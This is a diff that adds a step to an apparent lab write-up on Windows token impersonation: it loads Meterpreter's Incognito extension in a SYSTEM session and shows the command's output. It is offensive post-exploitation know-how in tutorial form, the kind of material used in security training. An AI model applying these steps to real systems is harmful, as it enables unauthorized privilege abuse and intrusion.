@@ -359,8 +359,18 @@ Server username: NT AUTHORITY\SYSTEM
   <img src="/writeups/token impersonation attack/images/STEP2-1.png" width="600">
 </p>
 
+## Step 2 - Load Incognito
 
+The Incognito extension allows token enumeration and impersonation.
 
+```bash
+load incognito
+```
+
+```text
+meterpreter > load incognito
+Loading extension incognito...Success.
+```
 
 
 
